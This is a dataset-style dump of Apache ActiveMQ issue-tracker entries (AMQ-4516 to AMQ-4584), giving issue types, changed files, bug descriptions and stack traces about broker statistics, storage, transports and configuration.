org.apache.activemq.broker.BrokerFilter.addDestination(BrokerFilter.java:145) at org.apache.activemq.broker.MutableBrokerFilter.addDestination(MutableBrokerFilter.java:151) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:389) at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:282) at org.apache.activemq.advisory.AdvisoryBroker.fireAdvisory(AdvisoryBroker.java:550) at org.apache.activemq.advisory.AdvisoryBroker.messageExpired(AdvisoryBroker.java:291) at org.apache.activemq.broker.BrokerFilter.messageExpired(BrokerFilter.java:257) at org.apache.activemq.broker.BrokerFilter.messageExpired(BrokerFilter.java:257) at org.apache.activemq.broker.MutableBrokerFilter.messageExpired(MutableBrokerFilter.java:269) at org.apache.activemq.broker.region.Queue.messageExpired(Queue.java:1793) at org.apache.activemq.broker.region.Queue.messageExpired(Queue.java:1786) at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1911) at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1854) at org.apache.activemq.broker.region.Queue.purge(Queue.java:1244) at org.apache.activemq.broker.region.TempQueue.dispose(TempQueue.java:95) at org.apache.activemq.broker.region.AbstractTempRegion.dispose(AbstractTempRegion.java:100) - locked <0x00000007c45a8718> (a org.apache.activemq.broker.jmx.ManagedTempQueueRegion) at org.apache.activemq.broker.region.AbstractRegion.removeDestination(AbstractRegion.java:216) at org.apache.activemq.broker.region.TempQueueRegion.removeDestination(TempQueueRegion.java:63) at org.apache.activemq.broker.jmx.ManagedTempQueueRegion.removeDestination(ManagedTempQueueRegion.java:63) at org.apache.activemq.broker.region.RegionBroker.removeDestination(RegionBroker.java:290) at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:149) at org.apache.activemq.advisory.AdvisoryBroker.removeDestination(AdvisoryBroker.java:202) at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:149) at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:149) at org.apache.activemq.broker.MutableBrokerFilter.removeDestination(MutableBrokerFilter.java:155) at org.apache.activemq.broker.TransportConnection.processRemoveConnection(TransportConnection.java:815) - locked <0x00000007c46b1168> (a org.apache.activemq.broker.jmx.ManagedTransportConnection) at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:72) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:329) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:722)Found 1 deadlock.Heap PSYoungGen      total 56064K, used 53316K [0x00000007c1600000, 0x00000007c8380000, 0x0000000800000000)  eden space 48064K, 96% used [0x00000007c1600000,0x00000007c43411b0,0x00000007c44f0000)  from space 8000K, 87% used [0x00000007c44f0000,0x00000007c4bc0000,0x00000007c4cc0000)  to   space 8000K, 0% used [0x00000007c7bb0000,0x00000007c7bb0000,0x00000007c8380000) ParOldGen       total 128256K, used 2922K [0x0000000744200000, 0x000000074bf40000, 0x00000007c1600000)  object space 128256K, 2% used [0x0000000744200000,0x00000007444daab8,0x000000074bf40000) PSPermGen       total 21248K, used 13151K [0x000000073f000000, 0x00000007404c0000, 0x0000000744200000)  object space 21248K, 61% used [0x000000073f000000,0x000000073fcd7eb8,0x00000007404c0000)
issueID:AMQ-4516
type:Bug
changed files:
texts:Don&#39;t decrement topic enqueues when messages are expired
When messages expire from a topic, the destination statistics are updated to reflect the expire, but it also decrements the enqueue counters which proves to be a little confusing. Once a message has been "enqueued", the destination should always reflect that a message was "enqueued" even if it eventually becomes expired. From this mailing list message:http://activemq.2283324.n4.nabble.com/Question-regarding-to-EnqueueCount-and-ExpiredCount-for-topic-destination-tt4666634.html
issueID:AMQ-4517
type:Bug
changed files:
texts:The Advisory for Messages being sent to the DLQ is sent regardless of the Message actually being DLQd
When we attempt to send a Message to the DLQ we allow for various settings to determine if the Message in fact get placed in the DLQ or discarded.  Right now we send the advisory even if we end up discarding the Message which could lead to some confusion.
issueID:AMQ-4518
type:Improvement
changed files:
texts:Expired Message check being done when its not really needed [Performance Issue]
There are cases now where we are checking for expired Messages and DLQ"ing then and sending advisories when we don"t really need to.  One example is on destroy of a TempQueue we call purge in Queue which will end up removing all messages for the sake of freeing up their MemoryUsage but we end up processing expired Messages in this case which doesn"t make a lot of sense since the destination is going away.  More generally a do we really want to process expired on a Purge call?These expired Messages lead to advisories and DLQ"d Message that might not really need to be done.
issueID:AMQ-4519
type:Bug
changed files:
texts:MasterLevelDBStore does not shutdown its protocol server when stopped
Mistype? When master level DB is stopped, the transport server is "started" instead of "stopped".
issueID:AMQ-452
type:New Feature
changed files:Region.java
MutableBrokerFilter.java
RegionBroker.java
ErrorBroker.java
EmptyBroker.java
BrokerFilter.java
AbstractRegion.java
texts:create a virtual Queue for durable topic subscriptions so that multiple consumers can consume in parallel from the same topic subscription with queue semantics, yet preserving the topic semantics
None
issueID:AMQ-4520
type:Improvement
changed files:BrokerService.java
texts:Allow the bouncy castle security provider to be used if present in the lib dir.
On Java 7, we sometimes see errors when using SSL. For instance:2013-04-23 09:02:36,864 &#91;ActiveMQ Transport: ssl:///xx.xx.xx.xx:51341&#93; WARN Transport - Transport Connection to: tcp://xx.xx.xx.xx:51341 failed: javax.net.ssl.SSLHandshakeException: Invalid Padding length: 226This is a known problem which has been fixed in Apollo, see https://issues.apache.org/jira/browse/APLO-287.We should provide a similar fix for ActiveMQ 5.9
issueID:AMQ-4522
type:Improvement
changed files:
texts:Allow setting timeToLive when sending messages using JMX
It"s not easy to set proper expiration for the message using external tools, so specifying just time to live on a message that"s sent using JMX would be nice.
issueID:AMQ-4524
type:Task
changed files:
texts:Remove camel-jetty dep from project
Remove dep of camel-jetty from main POM
issueID:AMQ-4526
type:New Feature
changed files:BrokerView.java
texts:ActiveMQ should automatically restart if a Locker looses it&#39;s lock.
Right now when a Locker looses its" lock, the broker just stops.  It should restart to retry acquiring the lock.
issueID:AMQ-4529
type:Bug
changed files:JDBCMessageStore.java
JDBCPersistenceAdapter.java
JdbcMemoryTransactionStore.java
texts:leveldb store NPEs when you send to a composite destination.
None
issueID:AMQ-4530
type:Bug
changed files:
texts:activemq-web unable to show StringProperties on Message
When browsing queues with jconsole or using the web console, I am unable to obtain any StringProperties on a message. Despite this, they do show up in PropertiesText.I have investigated and made a testcase and a patch, but they are both ugly and hackish so someone needs to review them.The problem stems from the createTabularData in OpenTypeSupport, where an instanceof check against String is performed on property values. String properties however seem to be instances of org.fusesource.hawtbuf.UTF8Buffer, which (obviously) doesn"t subclass String, so they aren"t put in the TabularDataSupport return-value.As near as I can tell, this affects both trunk and 5.8, but I haven"t checked it against 5.7.0.
issueID:AMQ-4531
type:Bug
changed files:
texts:TcpTransportServer can leak FDs when maximumConnection is set and the limit exceeded
We don"t close accepted sockets when we reach maximumConnections which can lead to leaking File Descriptors over time.
issueID:AMQ-4532
type:Bug
changed files:
texts:shutdown of VMTransportServer should report disposed exception to peer pending requests
When a broker is shutdown all transport connectors are shutdown ok. However a vm client with pending asyncRequests does not get a notification of the peer (server in this case) shutdown and waits for ever.This is noticeable in camel routes that do graceful shutdown from a shutdown hook when there are pending requests.The current shutdown/stop logic sends a shutdowninfo which works fine when the client initiates the stop but shutdown in not processed by a client.A simple fix is to propagate a shutdown/disposed exception that clients will respond to and error out any pending futures.
issueID:AMQ-4534
type:Bug
changed files:
texts:When using ElectingLevelDBStore cannot delete all messages on startup
Cannot call BrokerService#deleteAllMessages() nor setDeleteAllMessagesOnStartup() when using ElectingLevelDBStore... this is because the elector has not yet been run, and is null. Simple solution is override it (like a handful of other methods that are not intended to be called without having an elected master) and give it a default behavior.
issueID:AMQ-4535
type:Bug
changed files:DBManager.scala
Queue.java
Transaction.java
texts:activemq configured with leveldb commit fail when accessed by PutGet f-tion from IBM Perf Harness
Poor performance and exceptions thrown when leveldb is configured with activemq while performance is measured with IBM Performance Harness. We use default configuration of activemq except that leveldb is used instead of kahadb. Test scenario uses jms.r11.PutGet which sends a message then receives one from the same queue. Normal usage is with correlation identifier to ensure the same message is received. Exception thrown by the broker : WARN | Store COMMIT FAILED: scala.MatchError: null at org.apache.activemq.leveldb.DelayableUOW.dequeue(DBManager.scala:282) at org.apache.activemq.leveldb.LevelDBStore$LevelDBMessageStore.doRemove(LevelDBStore.scala:578) at org.apache.activemq.leveldb.LevelDBStore$Transaction$$anon$3.commit(LevelDBStore.scala:328) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1$$anonfun$apply$10.apply(LevelDBStore.scala:381) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1$$anonfun$apply$10.apply(LevelDBStore.scala:380) at scala.collection.immutable.List.foreach(List.scala:309) at scala.collection.generic.TraversableForwarder$class.foreach(TraversableForwarder.scala:32) at scala.collection.mutable.ListBuffer.foreach(ListBuffer.scala:45) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1.apply(LevelDBStore.scala:380) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1.apply(LevelDBStore.scala:379) at org.apache.activemq.leveldb.LevelDBStore.withUow(LevelDBStore.scala:536) at org.apache.activemq.leveldb.LevelDBStore.commit(LevelDBStore.scala:379) at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:72) at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:263) at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103) at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:456) at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:329) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:722) The transaction does not exist Exception thrown by the client: PutGet1: Uncaught exception. javax.jms.JMSException: STORE COMMIT FAILED: Transaction rolled back. at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1391) at org.apache.activemq.TransactionContext.syncSendPacketWithInterruptionHandling(TransactionContext.java:748) at org.apache.activemq.TransactionContext.commit(TransactionContext.java:322) at org.apache.activemq.ActiveMQSession.commit(ActiveMQSession.java:561) at com.ibm.uk.hursley.perfharness.jms.r11.PutGet.oneIteration(PutGet.java:97) at com.ibm.uk.hursley.perfharness.WorkerThread.pace(WorkerThread.java:247) at com.ibm.uk.hursley.perfharness.WorkerThread.pace(WorkerThread.java:434) at com.ibm.uk.hursley.perfharness.jms.r11.JMS11WorkerThread.run(JMS11WorkerThread.java:286) at com.ibm.uk.hursley.perfharness.jms.r11.PutGet.run(PutGet.java:86) Caused by: javax.transaction.xa.XAException: STORE COMMIT FAILED: Transaction rolled back. at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:77) at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:263) at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103) at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:456) at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:329) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:184) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:288) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:722) Caused by: java.lang.Throwable: scala.MatchError: null at org.apache.activemq.leveldb.DelayableUOW.dequeue(DBManager.scala:282) at org.apache.activemq.leveldb.LevelDBStore$LevelDBMessageStore.doRemove(LevelDBStore.scala:578) at org.apache.activemq.leveldb.LevelDBStore$Transaction$$anon$3.commit(LevelDBStore.scala:328) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1$$anonfun$apply$10.apply(LevelDBStore.scala:381) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1$$anonfun$apply$10.apply(LevelDBStore.scala:380) at scala.collection.immutable.List.foreach(List.scala:309) at scala.collection.generic.TraversableForwarder$class.foreach(TraversableForwarder.scala:32) at scala.collection.mutable.ListBuffer.foreach(ListBuffer.scala:45) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1.apply(LevelDBStore.scala:380) at org.apache.activemq.leveldb.LevelDBStore$$anonfun$commit$1.apply(LevelDBStore.scala:379) at org.apache.activemq.leveldb.LevelDBStore.withUow(LevelDBStore.scala:536) at org.apache.activemq.leveldb.LevelDBStore.commit(LevelDBStore.scala:379) at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:72) ... 13 more PutGet8: STOP After the test finished, we had several messages left in queues. We tried to read them with a different client and not in all cases we succeeded. However, after the broker restart, we could read the rest of messages. Our results for performance testing can be found at http://wiki.test.redhat.com/MRG/Messaging/PerformanceTesting/releases/m26_m29
issueID:AMQ-4539
type:Improvement
changed files:
texts:make the networkTTL or brokerPath visible via jmx and via a message property
when brokers are networked and messages cannot propagate due to reaching their configured number of hops (network connector networkTTL) it would help to be able to visualise the brokerPath, the size if which constitutes the networkTTL
issueID:AMQ-4540
type:Bug
changed files:DemandSubscription.java
texts:NetworkBridge - don&#39;t wait for ever for demandSubscription pending send responses on remove
In a networkbridge, a demandSub tracks outstanding asyncRquests and waits for them to complete on removal such that the messages can be acked correctly when the send completes.If the send is blocked on pfc on the remote broker, it may not return for some time, which blocks other removals leaving messages stuck inflight to networked subscriptions.The wait ensures that a message send will not be a duplicate, but blocking for ever does not make sense, especially considering that removes are serialised.We need some openwire command that can cancel pending sends to sort out this case but even then we need to timeout at some stage in case the other end cannot respond.
issueID:AMQ-4542
type:Bug
changed files:
texts:Broken javax.jms.Message.getObjectProperty(String)
The implementation provided by ActiveMQ of javax.jms.Message.getObjectProperty(String) does not return a value when the property is JMSXUserID.This causes a null pointer exception in org.apache.activemq.web.MessageServlet.setResponseHeaders as message.getObjectProperty(name).toString() is used within the loop.Using javax.jms.Message.getStringProperty(String) solves the problem.To reproduce, try to consume a message via the REST interface when the broker is configured with populateJMSXUserID="true" and       useAuthenticatedPrincipalForJMSXUserID="true".
issueID:AMQ-4544
type:Bug
changed files:
texts:Cant send MQTT message to AMQP endpoints
Seems there is error converting JMS messages to AMQP messages.
issueID:AMQ-4548
type:Bug
changed files:MessageDatabase.java
texts:KahaDB can recover old inflight XA transactions that keep logs from being cleaned up.
When doing a recovery its possible for KahaDB to recover XA transactions that were previously prepared and committed and leave them in a transient in-flight state.  This causes the GC cycle to hold old log files when they could otherwise be deleted.  These in-flight transactions can be discarded once recovery compeletes.
issueID:AMQ-4549
type:Improvement
changed files:
texts:The activemq-all and activemq-osgi modules should have proper uber sources.jar files too.
This would help anyone that runs against those artifacts to be able to setup debugging in an IDE.
issueID:AMQ-4552
type:Task
changed files:
texts:activemq-karaf - Should be able to install in Karaf 2.3
There is a few problems with the features.xml file so you cannot install activemq in karaf.
issueID:AMQ-4554
type:Bug
changed files:
texts:NumberFormatException when parsing JMSXProducerTXID
When creating a simple message using ActiveMQ and trying to receive that same message. We get the following stacktrace when trying to retrieve JMSXProducerTXID.[SEVERE] Thread death for Transacted Thread caused by For input string: "TX:ID:ID-PC12010.local-59923-1369316134520-2:10:1"java.lang.NumberFormatException: For input string: "TX:ID:ID-PC12010.local-59923-1369316134520-2:10:1"    at java.lang.NumberFormatException.forInputString(NumberFormatException.java:48)    at java.lang.Integer.parseInt(Integer.java:449)    at java.lang.Integer.<init>(Integer.java:660)    at org.apache.activemq.filter.PropertyExpression$14.evaluate(PropertyExpression.java:147)    at org.apache.activemq.filter.PropertyExpression.evaluate(PropertyExpression.java:194)    at org.apache.activemq.command.ActiveMQMessage.getObjectProperty(ActiveMQMessage.java:509)    at org.apache.activemq.command.ActiveMQMessage.getStringProperty(ActiveMQMessage.java:604)    at com.id.scriptura.documentflow.standard.impl.jms.JMSMessageConsumerStep$TransactedMessageReceiver.run(Unknown Source)    at java.lang.Thread.run(Thread.java:680)This property is set by ActiveMQ and NOT by our application. The code for retrieving is like this:msg.getStringProperty(JMSXProducerTXID)
issueID:AMQ-4555
type:Bug
changed files:
texts:Locking in SimpleCachedLDAPAuthorizationMap can lead to delays in Message dispatch.
The SimpleCachedLDAPAuthorizationMap attempts to cache the LDAP authentication data; however, the locking used in the update phase can lead the broker to stall message dispatch since every caller that looks up security ACLs will wait until the update completes.  Since we are caching the updates should occur asynchronously and only replace the existing cached values once the update completes.
issueID:AMQ-4557
type:Task
changed files:
texts:Upgrade dependency to karaf 2.3.1
as from subject upgrade the karaf version
issueID:AMQ-4559
type:Bug
changed files:
texts:Minor error in org.apache.activemq.transport.amqp.JMSClientTest
There"s an assert that works on "message" which is the sent version of the message, rather than "msg" which is the received message.
issueID:AMQ-4560
type:Bug
changed files:AmqpProtocolConverter.java
texts:Exception from AMQP transport when dispatching Messages from the store.
When messages are placed in a Queue and the broker is restarted the AMQP transport will throw the following exception on dispatch of the Message recovered from the store. javax.jms.MessageNotReadableException: Message body is write-only at org.apache.activemq.command.ActiveMQBytesMessage.checkWriteOnlyBody(ActiveMQBytesMessage.java:863) at org.apache.activemq.command.ActiveMQBytesMessage.initializeReading(ActiveMQBytesMessage.java:868) at org.apache.activemq.command.ActiveMQBytesMessage.getBodyLength(ActiveMQBytesMessage.java:190) at org.apache.qpid.proton.jms.AMQPNativeOutboundTransformer.transform(AMQPNativeOutboundTransformer.java:63) at org.apache.qpid.proton.jms.AutoOutboundTransformer.transform(AutoOutboundTransformer.java:37) at org.apache.activemq.transport.amqp.AmqpProtocolConverter$ConsumerContext.pumpOutbound(AmqpProtocolConverter.java:751) at org.apache.activemq.transport.amqp.AmqpProtocolConverter$ConsumerContext.onMessageDispatch(AmqpProtocolConverter.java:710) at org.apache.activemq.transport.amqp.AmqpProtocolConverter.onActiveMQCommand(AmqpProtocolConverter.java:300) at org.apache.activemq.transport.amqp.AmqpTransportFilter.oneway(AmqpTransportFilter.java:64) at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1378) at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:897) at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:943) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:895) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:918) at java.lang.Thread.run(Thread.java:680)
issueID:AMQ-4562
type:Bug
changed files:SimplePriorityMessageDispatchChannel.java
texts:SimplePriorityMessageDispatchChannel.clear() needs to reset size attribute
SimplePriorityMessageDispatchChannel.clear() deletes all prefetched messages but does not reset the size counter. The other method removeAll() does it correctly.Propose to fix this as follows:SimplePriorityMessageDispatchChannel.java    public void clear() {        synchronized (mutex) {            for (int i = 0; i < MAX_PRIORITY; i++) {                lists[i].clear();            }     size = 0;        }    }
issueID:AMQ-4563
type:Bug
changed files:
texts:Persisted messages reappear after broker restart when using amqp
To reproduce this, do the following1. Start a broker, create a producer using amqp, and send some messages2. Stop/Start broker3. Create a consumer to consume messages from step 1.4. Stop/Start broker5. Run consumer again.  It will receive the same messages it already received in step 3.I will attach a unit test which reproduces this.
issueID:AMQ-4567
type:New Feature
changed files:
texts:JMX operations on broker bypass authorization plugin
When securing the broker using authentication and authorization, any JMX operations on the broker completely bypass the authorization plugin.So anyone can modify the broker bypassing the security checks. Also, because of this its not possible to define a read only user for the web console.
issueID:AMQ-4568
type:Bug
changed files:
texts:org.apache.activemq.transport.amqp.AmqpTransformerTest#testRawTransformation hangs
This test is currently hanging.  I"ll attach a stack trace and a test patch which includes a timeout.
issueID:AMQ-4571
type:Improvement
changed files:DestinationFilter.java
texts:Improve DestinationFilter to allow any filter to unsubscribe its wrapped destination from a durable subscruption
Related to AMQ-4356 lets make the durable unsbscribe possible from any DestinationFilter so that custom filters can clean up properly.
issueID:AMQ-4574
type:New Feature
changed files:CamelEndpointLoader.java
ActiveMQComponent.java
texts:Add EndpointCompleter functionality to ActiveMQ Camel component
It will make it available for tools to autocomplete destinations names when creating routes.
issueID:AMQ-4575
type:Bug
changed files:
texts:JDBCIOExceptionHandler does not restart TransportConnector when JMX is enabled  on broker - java.io.IOException: Transport Connector could not be registered in JMX
Without JMX enabled on the broker; when the DB is shutdown and subsequently restarted the JDBCIOExceptionHandler does a shutdown and restart on the transport connector as expected.However when JMX is enabled on the broker the transport connector fails to restart throwing the following exception and subsequently shutting down the broker 2013-06-06 15:25:22,113 [st IO exception] - INFO  DefaultIOExceptionHandler      - Stopping the broker due to exception, java.io.IOException: Transport Connector could not be registered in JMX: org.apache.activemq:type=Broker,brokerName=localhost,connector=clientConnectors,connectorName=tcp_//sideshow.home_61616java.io.IOException: Transport Connector could not be registered in JMX: org.apache.activemq:type=Broker,brokerName=localhost,connector=clientConnectors,connectorName=tcp_//sideshow.home_61616 at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:27) at org.apache.activemq.broker.BrokerService.registerConnectorMBean(BrokerService.java:1972) at org.apache.activemq.broker.BrokerService.startTransportConnector(BrokerService.java:2434) at org.apache.activemq.broker.BrokerService.startAllConnectors(BrokerService.java:2351) at org.apache.activemq.util.DefaultIOExceptionHandler$2.run(DefaultIOExceptionHandler.java:101)Caused by: javax.management.InstanceAlreadyExistsException: org.apache.activemq:type=Broker,brokerName=localhost,connector=clientConnectors,connectorName=tcp_//sideshow.home_61616 at com.sun.jmx.mbeanserver.Repository.addMBean(Repository.java:453) at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.internal_addObject(DefaultMBeanServerInterceptor.java:1484) at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerDynamicMBean(DefaultMBeanServerInterceptor.java:963) at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerObject(DefaultMBeanServerInterceptor.java:917) at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerMBean(DefaultMBeanServerInterceptor.java:312) at com.sun.jmx.mbeanserver.JmxMBeanServer.registerMBean(JmxMBeanServer.java:482) at org.apache.activemq.broker.jmx.ManagementContext.registerMBean(ManagementContext.java:380) at org.apache.activemq.broker.jmx.AnnotatedMBean.registerMBean(AnnotatedMBean.java:72) at org.apache.activemq.broker.BrokerService.registerConnectorMBean(BrokerService.java:1969) ... 3 more
issueID:AMQ-4576
type:Bug
changed files:
texts:MQTT BlockingConnection.receive fails when subscribing multiple topics
When more than one topic is supplied to BlockingConnection.subscribe the BlockingConnection.receive fails and the following exception is thrown:java.io.IOException: Could not connect: CONNECTION_REFUSED_SERVER_UNAVAILABLE at org.fusesource.mqtt.client.CallbackConnection$LoginHandler$1.onTransportCommand(CallbackConnection.java:331) at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:659) at org.fusesource.hawtdispatch.transport.SslTransport.drainInbound(SslTransport.java:264) at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538) at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209) at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100) at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)On the server shows the following messages:2013-06-06 15:06:00,125 WARN  [org.apache.activemq.transport.mqtt.MQTTProtocolConverter] (ActiveMQ BrokerService[localhost] Task-1) Exception occurred processing: null: javax.jms.JMSException: Durable consumer is in use for client: 6056@3232261834SOC and subscriptionName: 6056@3232261834SOC2013-06-06 15:06:00,130 WARN  [org.apache.activemq.broker.TransportConnection] (ActiveMQ Transport: tcp:///127.0.0.1:53389@1883) Failed to add Connection ID:LTD-SFW004-53303-1370527418664-2:14, reason: javax.jms.InvalidClientIDException: Broker: localhost - Client: 6056@3232261834SOC already connected from tcp://127.0.0.1:533882013-06-06 15:06:00,130 WARN  [org.apache.activemq.broker.TransportConnection.Transport] (ActiveMQ Transport: tcp:///127.0.0.1:53389@1883) Transport Connection to: tcp://127.0.0.1:53389 failed: java.io.IOException: Broker: localhost - Client: 6056@3232261834SOC already connected from tcp://127.0.0.1:533882013-06-06 15:06:00,130 ERROR [pt.intellicare.onecare.mqtt.OneCareFuseMqttClient] (DefaultQuartzScheduler_Worker-8) Problem receiving mqtt messages: java.io.IOException: Could not connect: CONNECTION_REFUSED_SERVER_UNAVAILABLE at org.fusesource.mqtt.client.CallbackConnection$LoginHandler$1.onTransportCommand(CallbackConnection.java:331) [:1.5-SNAPSHOT] at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:659) [:1.17] at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:538) [:1.17] at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209) [:1.17] at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100) [:1.17] at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77) [:1.17]Code example:MQTT = new MQTT();mqtt.setHost(url);mqtt.setClientId(clientId);mqtt.setUserName(user);mqtt.setPassword(password);mqtt.setCleanSession(false);BlockingConnection connection = mqtt.blockingConnection();connection.connect();Topic[] topics = {new Topic("TopicA", QoS.EXACTLY_ONCE), new Topic("TopicB", QoS.EXACTLY_ONCE)};byte[] qoses = connection.subscribe(topics);while (true) {    Message message = connection.receive();    byte[] payload = message.getPayload();    String messageContent = new String(payload);    System.out.println("Received message from topic: " + message.getTopic() + " Message content: " + messageContent);    message.ack();}The test failed when using the current fusesource client (1.5) on ActiveMQ 5.9, on Mosquitto mqtt the code works correctly.
issueID:AMQ-4577
type:Improvement
changed files:QueueSubscription.java
texts:log level used to say a message ack was ignored because the message is expired should be debug and not warn
None
issueID:AMQ-458
type:Improvement
changed files:
texts:allow non-durable messages which have no consumers to be sent to a dead letter topic
None
issueID:AMQ-4581
type:Bug
changed files:
texts:JDBCPersistenceAdapter can ignore statements settings depending on configuration order.
When a jdbcPersistenceAdapter is configured using the "adapter" attribute (as below), the tablePrefix specified in the statements element is ignored during table creation.<jdbcPersistenceAdapter createTablesOnStartup="true" dataSource="#mysql-ds" adapter="#sybase-adapter"  useDatabaseLock="true">  <statements>    <statements tablePrefix="myprefix_"/>  </statements></jdbcPersistenceAdapter>  .....<bean id="sybase-adapter" class="org.apache.activemq.store.jdbc.adapter.SybaseJDBCAdapter"/>It seems spring is calling the org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.setAdapter() method before org.apache.activemq.store.jdbc.JDBCPersistenceAdapter.setStatements() is called. The setAdapter() triggers the table creation - hence no *tablePrefix" is used.This problems can be worked around if the adapter is configured as an element (as below) however this isn"t the most ideal fix.<persistenceAdapter>  <jdbcPersistenceAdapter>    <statements>      <statements tablePrefix="myprefix_"/>    </statements>    <adapter>      <sybase-jdbc-adapter/>    </adapter>  </jdbcPersistenceAdapter></persistenceAdapter>
issueID:AMQ-4582
type:Bug
changed files:
texts:Specifying invalid ciphersuite in SSL transport causes all available ciphersuites to be enabled
If you use an invalid cipher suite in the parameter "transport.enabledCipherSuites" on an SSL transport connector, the broker will start with all ciphers enabled.For example, use this transport connector:    <transportConnectors>      <transportConnector name="ssl" uri="ssl://localhost:61717?needClientAuth=true&transport.enabledCipherSuites=foobar"/>    </transportConnectors>This is an attempt to enable the ciphersuite "foobar". The broker starts, and, in my environment I end up with 26 cipher suites enabled, 10 of which are generally considered weak.Using the debugger I tracked this down to the method org.apache.activemq.util.IntrospectionSupport.setProperty. It uses reflection to invoke SSLServerSocket.setEnabledCipherSuites. That method throws an IllegalArgumentException if the specified ciphersuite is enabled. IntrospectionSupport.setProperty catches the exception and returns false.I believe that this code should not be ignoring exceptions like this. This is a major security flaw: if a user is attempting to lock down ActiveMQ to a specific strong cipher suite, but makes a typo, the broker starts with with the ability to use weaker cipher suites.
issueID:AMQ-4584
type:Improvement
changed files:
texts:Allow configuration of a discarding dead letter strategy
